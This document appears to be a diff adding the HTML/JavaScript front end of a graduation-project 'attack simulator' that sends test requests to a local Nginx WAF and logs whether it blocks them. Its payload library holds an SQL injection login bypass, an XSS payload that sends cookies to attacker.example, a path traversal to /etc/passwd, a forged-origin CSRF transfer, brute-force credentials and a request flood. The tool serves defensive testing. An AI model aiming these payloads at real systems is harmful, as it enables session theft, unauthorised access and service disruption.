+        <button class="quick-ep-btn" onclick="setEndpoint('http://localhost:8060/api/login')">POST /api/login</button>
+        <button class="quick-ep-btn" onclick="setEndpoint('http://localhost:8060/api/search')">GET /api/search</button>
+        <button class="quick-ep-btn" onclick="setEndpoint('http://localhost:8060/api/upload')">POST /api/upload</button>
+        <button class="quick-ep-btn" onclick="setEndpoint('http://localhost:8060/')">/ (proxy root)</button>
+        <button class="quick-ep-btn" onclick="setEndpoint('http://localhost:8060/health')">GET /health</button>
+      </div>
+    </div>
+
+    <div class="form-grid">
+      <div class="field-group">
+        <label for="targetUrl">🎯 Target URL <span style="color:var(--neon-blue);font-size:.65rem;">(via Nginx WAF :8060)</span></label>
+        <input id="targetUrl" class="field-input" type="url"
+          placeholder="http://localhost:8060/api/login"
+          value="http://localhost:8060/api/login"
+          autocomplete="off" spellcheck="false" />
+      </div>
+      <div class="field-group">
+        <label for="httpMethod">📡 HTTP Method</label>
+        <select id="httpMethod" class="field-select">
+          <option value="POST">POST</option>
+          <option value="GET">GET</option>
+          <option value="PUT">PUT</option>
+          <option value="DELETE">DELETE</option>
+          <option value="PATCH">PATCH</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="form-grid">
+      <div class="field-group">
+        <label for="contentType">📋 Content-Type</label>
+        <select id="contentType" class="field-select">
+          <option value="application/json">application/json</option>
+          <option value="application/x-www-form-urlencoded">application/x-www-form-urlencoded</option>
+          <option value="text/plain">text/plain</option>
+          <option value="multipart/form-data">multipart/form-data</option>
+        </select>
+      </div>
+      <div class="field-group">
+        <label for="customHeader">🔑 Custom Header (optional)</label>
+        <input id="customHeader" class="field-input" type="text"
+          placeholder="X-Custom: value" spellcheck="false" />
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ ATTACK VECTOR ═══════════════════ -->
+  <div class="glass-card section-gap">
+    <div class="section-title">💥 Attack Vector</div>
+
+    <div class="vector-cards">
+      <div class="vector-card active" id="card-sqli" onclick="selectVector('sqli')">
+        <span class="risk-badge risk-critical">CRITICAL</span>
+        <span class="vector-icon">🗄️</span>
+        <div class="vector-name">SQLi</div>
+      </div>
+      <div class="vector-card" id="card-xss" onclick="selectVector('xss')">
+        <span class="risk-badge risk-high">HIGH</span>
+        <span class="vector-icon">📜</span>
+        <div class="vector-name">XSS</div>
+      </div>
+      <div class="vector-card" id="card-path" onclick="selectVector('path')">
+        <span class="risk-badge risk-high">HIGH</span>
+        <span class="vector-icon">📂</span>
+        <div class="vector-name">Path Traversal</div>
+      </div>
+      <div class="vector-card" id="card-brute" onclick="selectVector('brute')">
+        <span class="risk-badge risk-medium">MEDIUM</span>
+        <span class="vector-icon">🔨</span>
+        <div class="vector-name">Brute Force</div>
+      </div>
+      <div class="vector-card" id="card-rate" onclick="selectVector('rate')">
+        <span class="risk-badge risk-medium">MEDIUM</span>
+        <span class="vector-icon">⚡</span>
+        <div class="vector-name">Rate Limiting</div>
+      </div>
+      <div class="vector-card" id="card-csrf" onclick="selectVector('csrf')">
+        <span class="risk-badge risk-high">HIGH</span>
+        <span class="vector-icon">🎭</span>
+        <div class="vector-name">CSRF</div>
+      </div>
+    </div>
+
+    <!-- Dropdown (synced with cards) -->
+    <div class="form-grid" style="margin-bottom:1rem;">
+      <div class="field-group">
+        <label for="attackVector">🔻 Selected Vector</label>
+        <select id="attackVector" class="field-select" onchange="onVectorDropdownChange(this.value)">
+          <option value="sqli">SQL Injection (SQLi)</option>
+          <option value="xss">Cross-Site Scripting (XSS)</option>
+          <option value="path">Path Traversal</option>
+          <option value="brute">Brute Force</option>
+          <option value="rate">Rate Limiting (50 rapid requests)</option>
+          <option value="csrf">Cross-Site Request Forgery (CSRF)</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Payload -->
+    <div class="field-group">
+      <div class="payload-header">
+        <label for="attackPayload">💣 Attack Payload</label>
+        <span class="payload-chip" id="payloadChip">🗄️ SQLi · CLASSIC UNION</span>
+      </div>
+      <textarea id="attackPayload" class="field-textarea" spellcheck="false"></textarea>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ ADVANCED OPTIONS ═══════════════════ -->
+  <div class="glass-card section-gap">
+    <div class="section-title">🔧 Advanced Options</div>
+    <div class="options-row">
+      <div class="field-group">
+        <label for="reqCount">🔁 Request Count (Rate Flood)</label>
+        <input id="reqCount" class="field-input" type="number" min="1" max="500" value="50" />
+      </div>
+      <div class="field-group">
+        <label for="reqDelay">⏱️ Delay Between Requests (ms)</label>
+        <input id="reqDelay" class="field-input" type="number" min="0" max="5000" value="0" />
+      </div>
+      <div class="toggle-group">
+        <span class="toggle-label">🔐 Options</span>
+        <label class="toggle-row">
+          <input type="checkbox" class="toggle-input" id="toggleVerbose" checked />
+          <div class="toggle-switch"></div>
+          <span class="toggle-text">Verbose Log</span>
+        </label>
+        <label class="toggle-row">
+          <input type="checkbox" class="toggle-input" id="toggleCors" checked />
+          <div class="toggle-switch"></div>
+          <span class="toggle-text">no-cors Mode</span>
+        </label>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ LAUNCH BUTTON + PROGRESS ═══════════════════ -->
+  <div class="glass-card section-gap">
+    <button class="launch-btn" id="launchBtn" onclick="launchAttack()">
+      <div class="btn-inner">
+        <span class="btn-icon">🚀</span>
+        <span id="btnText">LAUNCH ATTACK</span>
+      </div>
+    </button>
+
+    <div class="attack-progress" id="attackProgress">
+      <div class="progress-label">
+        <span id="progressLabel">Dispatching...</span>
+        <span id="progressPct">0%</span>
+      </div>
+      <div class="progress-bar-wrap">
+        <div class="progress-bar-fill" id="progressFill"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ RESPONSE VIEWER ═══════════════════ -->
+  <div class="response-viewer" id="responseViewer">
+    <div class="glass-card section-gap">
+      <div class="section-title">📨 Last Response</div>
+      <div class="response-grid">
+        <div class="response-box">
+          <div class="response-box-title" style="color:var(--neon-purple-lt)">WAF Decision</div>
+          <div id="wafDecision">—</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--txt-muted);margin-top:0.5rem;" id="responseMetaInfo">—</div>
+        </div>
+        <div class="response-box">
+          <div class="response-box-title" style="color:var(--neon-blue)">Response Body (preview)</div>
+          <div class="response-body-text" id="responseBodyText">—</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ TERMINAL ═══════════════════ -->
+  <div class="glow-divider"></div>
+
+  <div class="terminal-card">
+    <div class="terminal-titlebar">
+      <div class="terminal-dots">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-yellow"></div>
+        <div class="t-dot t-dot-green"></div>
+      </div>
+      <div class="terminal-title">virex@simulator:~$ attack.log</div>
+      <div class="terminal-actions">
+        <button class="terminal-btn" onclick="clearTerminal()">CLR</button>
+        <button class="terminal-btn" onclick="exportLogs()">EXPORT</button>
+      </div>
+    </div>
+    <div class="terminal-body" id="terminal">
+      <span class="cursor-blink"></span>
+    </div>
+  </div>
+
+  <div class="glow-divider"></div>
+
+  <footer>
+    VIREX Security Platform · Attack Simulator ·
+    <span>WAF + SIEM</span> Testing Suite ·
+    Built for <span>Graduation Project Demo</span>
+  </footer>
+
+</div><!-- /app-wrapper -->
+
+<!-- ═══════════════════════════════════════════════════════════
+     JAVASCRIPT ENGINE
+═══════════════════════════════════════════════════════════ -->
+<script>
+  /* ──────────────────────────────────────────
+     PAYLOAD LIBRARY
+  ────────────────────────────────────────── */
+  // ── Nginx WAF Gateway base URL ──
+  const NGINX_BASE = 'http://localhost:8060';
+
+  const VECTORS = {
+    sqli: {
+      label:    '🗄️ SQLi · CLASSIC UNION',
+      payload:  '{"username": "admin\' OR \'1\'=\'1\' -- ", "password": "irrelevant"}',
+      method:   'POST',
+      endpoint: NGINX_BASE + '/api/login',
+    },
+    xss: {
+      label:    '📜 XSS · SCRIPT INJECT',
+      payload:  '{"comment": "<script>fetch(\'https://attacker.example/steal?c=\'+document.cookie)<\/script>", "post_id": 42}',
+      method:   'POST',
+      endpoint: NGINX_BASE + '/api/login',
+    },
+    path: {
+      label:    '📂 PATH · DIRECTORY TRAVERSAL',
+      payload:  '{"filename": "../../../../etc/passwd"}',
+      method:   'GET',
+      endpoint: NGINX_BASE + '/api/search',
+    },
+    brute: {
+      label:    '🔨 BRUTE · CREDENTIAL STORM',
+      payload:  '{"username": "admin", "password": "password123"}',
+      method:   'POST',
+      endpoint: NGINX_BASE + '/api/login',
+    },
+    rate: {
+      label:    '⚡ RATE · FLOOD — 50 RAPID REQUESTS',
+      payload:  '{"probe": "rate-limit-test", "timestamp": "<AUTO>"}',
+      method:   'POST',
+      endpoint: NGINX_BASE + '/api/login',
+    },
+    csrf: {
+      label:    '🎭 CSRF · FORGED STATE MUTATION',
+      payload:  '{"action": "transfer", "amount": "99999", "to_account": "ATTACKER-001"}',
+      method:   'POST',
+      endpoint: NGINX_BASE + '/api/login',
+    },
+  };
+
+  /* ──────────────────────────────────────────
+     STATE
+  ────────────────────────────────────────── */
+  let currentVector = 'sqli';
+  let stats = { total: 0, blocked: 0, passed: 0, error: 0 };
+  let logBuffer = [];
+  let isRunning = false;
+
+  /* ──────────────────────────────────────────
+     INIT
+  ────────────────────────────────────────── */
+  window.addEventListener('DOMContentLoaded', () => {
+    selectVector('sqli');
+    spawnParticles();
+    termLog('sys',  'VIREX Attack Simulator v2.0 loaded');
+    termLog('sys',  'WAF Engine — ONLINE | SIEM Monitoring — ACTIVE');
+    termLog('info', 'Select an attack vector and configure your target URL.');
+    termLog('info', 'Press LAUNCH ATTACK when ready.');
+  });
+
+  /* ──────────────────────────────────────────
+     VECTOR SELECTION
+  ────────────────────────────────────────── */
+  function selectVector(v) {
+    currentVector = v;
+
+    document.querySelectorAll('.vector-card').forEach(c => c.classList.remove('active'));
+    const card = document.getElementById('card-' + v);
+    if (card) card.classList.add('active');
+
+    document.getElementById('attackVector').value = v;
+    document.getElementById('payloadChip').textContent = VECTORS[v].label;
+    document.getElementById('httpMethod').value = VECTORS[v].method || 'POST';
+    document.getElementById('attackPayload').value = VECTORS[v].payload;
+
+    // Auto-set the recommended Nginx endpoint for this vector
+    if (VECTORS[v].endpoint) {
+      document.getElementById('targetUrl').value = VECTORS[v].endpoint;
+    }
+
+    termLog('atk', 'Vector → ' + VECTORS[v].label);
+    termLog('sys', 'Endpoint → ' + (VECTORS[v].endpoint || document.getElementById('targetUrl').value));
+  }
+
+  function setEndpoint(url) {
+    document.getElementById('targetUrl').value = url;
+    termLog('sys', 'Target set → ' + url);
+  }
+
+  function onVectorDropdownChange(v) { selectVector(v); }
+
+  /* ──────────────────────────────────────────
+     TERMINAL LOGGING
+  ────────────────────────────────────────── */
+  function now() {
+    return new Date().toLocaleTimeString('en-GB', { hour12: false });
+  }
+
+  function termLog(type, msg) {
+    const terminal = document.getElementById('terminal');
+    const cursor   = terminal.querySelector('.cursor-blink');
+
+    const tagMap = {
+      sys:  ['[SYS]',  'tag-sys'],
+      atk:  ['[ATK]',  'tag-atk'],
+      ok:   ['[OK]',   'tag-ok'],
+      err:  ['[ERR]',  'tag-err'],
+      warn: ['[WARN]', 'tag-warn'],
+      info: ['[---]',  'tag-info'],
+    };
+
+    const [tag, cls] = tagMap[type] || ['[LOG]', 'tag-info'];
+    const line = document.createElement('div');
+    line.className = 'log-line';
+    line.innerHTML =
+      '<span class="log-time">' + now() + '</span>' +
+      '<span class="log-tag ' + cls + '">' + tag + '</span>' +
+      '<span class="log-msg">' + escHtml(msg) + '</span>';
+
+    terminal.insertBefore(line, cursor);
+    terminal.scrollTop = terminal.scrollHeight;
+    logBuffer.push('[' + now() + '] ' + tag + ' ' + msg);
+  }
+
+  function escHtml(s) {
+    return String(s)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;');
+  }
+
+  function clearTerminal() {
+    const terminal = document.getElementById('terminal');
+    terminal.innerHTML = '<span class="cursor-blink"></span>';
+    logBuffer = [];
+    termLog('sys', 'Terminal cleared.');
+  }
+
+  function exportLogs() {
+    const ts   = Date.now();
+    const blob = new Blob([logBuffer.join('\n')], { type: 'text/plain' });
+    const a    = document.createElement('a');
+    a.href     = URL.createObjectURL(blob);
+    a.download = 'virex-sim-' + ts + '.log';
+    a.click();
+    termLog('sys', 'Log exported → virex-sim-' + ts + '.log');
+  }
+
+  /* ──────────────────────────────────────────
+     STATS
+  ────────────────────────────────────────── */
+  function updateStats(key) {
+    stats.total++;
+    stats[key]++;
+    document.getElementById('statTotal').textContent   = stats.total;
+    document.getElementById('statBlocked').textContent = stats.blocked;
+    document.getElementById('statPassed').textContent  = stats.passed;
+    document.getElementById('statError').textContent   = stats.error;
+  }
+
+  /* ──────────────────────────────────────────
+     PROGRESS BAR
+  ────────────────────────────────────────── */
+  function setProgress(pct, label) {
+    document.getElementById('attackProgress').classList.add('visible');
+    document.getElementById('progressFill').style.width = pct + '%';
+    document.getElementById('progressLabel').textContent = label || 'Dispatching...';
+    document.getElementById('progressPct').textContent   = Math.round(pct) + '%';
+  }
+
+  function hideProgress() {
+    document.getElementById('attackProgress').classList.remove('visible');
+  }
+
+  /* ──────────────────────────────────────────
+     RESPONSE VIEWER
+  ────────────────────────────────────────── */
+  function showResponse(status, body) {
+    document.getElementById('responseViewer').classList.add('visible');
+
+    const wafDiv  = document.getElementById('wafDecision');
+    const bodyDiv = document.getElementById('responseBodyText');
+    const metaDiv = document.getElementById('responseMetaInfo');
+
+    if (status === 'blocked') {
+      wafDiv.innerHTML = '<span class="response-status-badge status-blocked">🛡️ BLOCKED</span>';
+    } else if (status === 'no-cors') {
+      wafDiv.innerHTML = '<span class="response-status-badge status-allowed">🔒 no-cors (opaque response)</span>';
+    } else if (status === 'passed') {
+      wafDiv.innerHTML = '<span class="response-status-badge status-allowed">⚠️ PASSED THROUGH</span>';
+    } else {
+      wafDiv.innerHTML = '<span class="response-status-badge status-error">❌ ERROR / UNREACHABLE</span>';
+    }
+
+    metaDiv.textContent = 'Timestamp: ' + new Date().toLocaleString() + ' · Vector: ' + VECTORS[currentVector].label;
+    bodyDiv.textContent = body || '(no-cors mode — response body opaque. Check WAF/SIEM dashboard.)';
+  }
+
+  /* ──────────────────────────────────────────
+     FLASH OVERLAY
+  ────────────────────────────────────────── */
+  function triggerFlash() {
+    const el = document.getElementById('attackFlash');
+    el.classList.remove('fire');
+    void el.offsetWidth;
+    el.classList.add('fire');
+  }
+
+  /* ──────────────────────────────────────────
+     CORE FETCH HELPER
+  ────────────────────────────────────────── */
+  async function sendRequest(url, payload, headers, method, useCors) {
+    const mode = useCors ? 'no-cors' : 'cors';
+    const opts = {
+      method,
+      mode,
+      headers,
+    };
+
+    if (method !== 'GET' && method !== 'HEAD') {
+      opts.body = payload;
+    }
+
+    try {
+      const res = await fetch(url, opts);
+
+      if (mode === 'no-cors') {
+        return { ok: true, status: 0, body: null, opaque: true };
+      }
+
+      let body = '';
+      try { body = await res.text(); } catch(e) { body = '(unreadable body)'; }
+      return { ok: res.ok, status: res.status, body, opaque: false };
+
+    } catch (e) {
+      return { ok: false, status: -1, body: e.message, opaque: false, error: true };
+    }
+  }
+
+  /* ──────────────────────────────────────────
+     LAUNCH ATTACK — MAIN
+  ────────────────────────────────────────── */
+  async function launchAttack() {
+    if (isRunning) return;
+
+    const url      = document.getElementById('targetUrl').value.trim();
+    const method   = document.getElementById('httpMethod').value;
+    const ct       = document.getElementById('contentType').value;
+    const customH  = document.getElementById('customHeader').value.trim();
+    const payload  = document.getElementById('attackPayload').value.trim();
+    const reqCount = parseInt(document.getElementById('reqCount').value) || 50;
+    const delay    = parseInt(document.getElementById('reqDelay').value)  || 0;
+    const verbose  = document.getElementById('toggleVerbose').checked;
+    const useCors  = document.getElementById('toggleCors').checked;
+
+    if (!url) {
+      termLog('err', 'Target URL is empty — aborting.');
+      return;
+    }
+
+    // Build headers
+    const headers = {};
+    if (method !== 'GET' && method !== 'HEAD') {
+      headers['Content-Type'] = ct;
+    }
+    if (customH && customH.includes(':')) {
+      const [hk, ...hvParts] = customH.split(':');
+      headers[hk.trim()] = hvParts.join(':').trim();
+    }
+    // CSRF: inject forged origin headers
+    if (currentVector === 'csrf') {
+      headers['X-Requested-With'] = 'XMLHttpRequest';
+      headers['Referer']          = 'https://evil-site.example.com';
+      headers['Origin']           = 'https://evil-site.example.com';
+    }
+
+    isRunning = true;
+    document.getElementById('launchBtn').disabled = true;
+    document.getElementById('btnText').textContent = 'ATTACKING...';
+    triggerFlash();
+
+    termLog('atk', '═══════════════════════════════════════');
+    termLog('atk', 'VECTOR   : ' + VECTORS[currentVector].label);
+    termLog('atk', 'TARGET   : ' + url);
+    termLog('atk', 'METHOD   : ' + method + ' | MODE: ' + (useCors ? 'no-cors' : 'cors'));
+    termLog('atk', 'PAYLOAD  : ' + payload.substring(0, 90) + (payload.length > 90 ? '...' : ''));
+    termLog('sys', 'Launching attack sequence...');
+
+    /* ── RATE LIMITING: burst flood ── */
+    if (currentVector === 'rate') {
+      termLog('warn', 'Rate flood initiated — dispatching ' + reqCount + ' rapid requests...');
+
+      let dispatched = 0, errored = 0;
+      const promises = [];
+
+      for (let i = 0; i < reqCount; i++) {
+        const idx = i;
+        const p = (async () => {
+          if (delay > 0) await sleep(idx * delay);
+
+          const tsPayload = payload.replace('<AUTO>', String(Date.now()));
+          const result    = await sendRequest(url, tsPayload, headers, method, useCors);
+          const pct       = ((idx + 1) / reqCount) * 100;
+          setProgress(pct, 'Flooding... [' + (idx + 1) + '/' + reqCount + ']');
+
+          if (result.error) {
+            errored++;
+            if (verbose) termLog('err', 'Req #' + (idx+1) + ' — Error: ' + result.body);
+            updateStats('error');
+          } else if (result.opaque) {
+            dispatched++;
+            if (verbose && idx % 10 === 0) termLog('ok', 'Req #' + (idx+1) + ' — Dispatched (opaque response)');
+            updateStats('passed');
+          } else if (result.status === 429 || result.status === 403) {
+            if (verbose) termLog('ok', 'Req #' + (idx+1) + ' — WAF blocked (' + result.status + ')');
+            updateStats('blocked');
+          } else {
+            dispatched++;
+            if (verbose && idx % 10 === 0) termLog('warn', 'Req #' + (idx+1) + ' — Passed (' + result.status + ')');
+            updateStats('passed');
+          }
+        })();
+        promises.push(p);
+      }
+
+      await Promise.all(promises);
+
+      termLog('sys', 'Rate flood complete. Dispatched=' + dispatched + ', Errors=' + errored);
+      showResponse(
+        errored === reqCount ? 'error' : (useCors ? 'no-cors' : 'passed'),
+        'Burst of ' + reqCount + ' requests sent. ' + errored + ' errors, ' + dispatched + ' dispatched.'
+      );
+
+    } else {
+      /* ── SINGLE PAYLOAD ATTACK ── */
+      setProgress(25, 'Connecting to target...');
+      termLog('info', 'Establishing connection to target...');
+      await sleep(180);
+
+      setProgress(55, 'Injecting payload...');
+      termLog('atk',  'Injecting ' + VECTORS[currentVector].label + ' payload...');
+      await sleep(100);
+
+      const result = await sendRequest(url, payload, headers, method, useCors);
+      setProgress(100, 'Response received.');
+
+      if (result.error) {
+        termLog('err', 'Network error — ' + result.body);
+        termLog('err', 'Target unreachable or connection refused.');
+        updateStats('error');
+        showResponse('error', result.body);
+
+      } else if (result.opaque) {
+        termLog('ok',  'Request dispatched in no-cors mode (opaque response).');
+        termLog('sys', 'Response hidden by browser CORS policy. Check WAF/SIEM logs directly.');
+        updateStats('passed');
+        showResponse('no-cors', null);
+
+      } else if (result.status === 403 || result.status === 400) {
+        termLog('ok',  'WAF BLOCKED the attack! HTTP ' + result.status);
+        termLog('sys', 'Check SIEM dashboard — event should now be logged.');
+        updateStats('blocked');
+        showResponse('blocked', result.body);
+
+      } else if (result.status === 429) {
+        termLog('ok',  'Rate limit triggered! HTTP 429 — Too Many Requests.');
+        updateStats('blocked');
+        showResponse('blocked', result.body);
+
+      } else if (result.status >= 200 && result.status < 300) {
+        termLog('warn', 'ALERT: Attack PASSED through WAF — HTTP ' + result.status + '. Review WAF rules!');
+        updateStats('passed');
+        showResponse('passed', result.body);
+
+      } else {
+        termLog('warn', 'Unexpected HTTP ' + result.status + ' — ' + String(result.body).substring(0, 120));
+        updateStats('error');
+        showResponse('error', result.body);
+      }
+
+      termLog('atk', '─── Attack sequence complete ───');
+    }
+
+    // Reset
+    isRunning = false;
+    document.getElementById('launchBtn').disabled = false;
+    document.getElementById('btnText').textContent = 'LAUNCH ATTACK';
+    setTimeout(hideProgress, 1600);
+  }
+
+  /* ──────────────────────────────────────────
+     UTILITY
+  ────────────────────────────────────────── */
+  function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  /* ──────────────────────────────────────────
+     FLOATING PARTICLES
+  ────────────────────────────────────────── */
+  function spawnParticles() {
+    const container = document.getElementById('particles');
+    const colors    = ['#9507c1', '#00d4ff', '#c040f5', '#0dffaa', '#ff2d55'];
+
+    for (let i = 0; i < 30; i++) {
+      const el    = document.createElement('div');
+      el.className = 'particle';
+
+      const size  = Math.random() * 4 + 1;
+      const x     = Math.random() * 100;
+      const dur   = Math.random() * 12 + 8;
+      const del   = Math.random() * 10;
+      const color = colors[Math.floor(Math.random() * colors.length)];
+
+      el.style.cssText =
+        'width:' + size + 'px;height:' + size + 'px;' +
+        'left:' + x + '%;' +
+        'background:' + color + ';' +
+        'box-shadow:0 0 ' + (size * 3) + 'px ' + color + ';' +
+        'animation-duration:' + dur + 's;' +
+        'animation-delay:-' + del + 's;';
+
+      container.appendChild(el);
+    }
+  }
+</script>
+
+</body>
+</html>
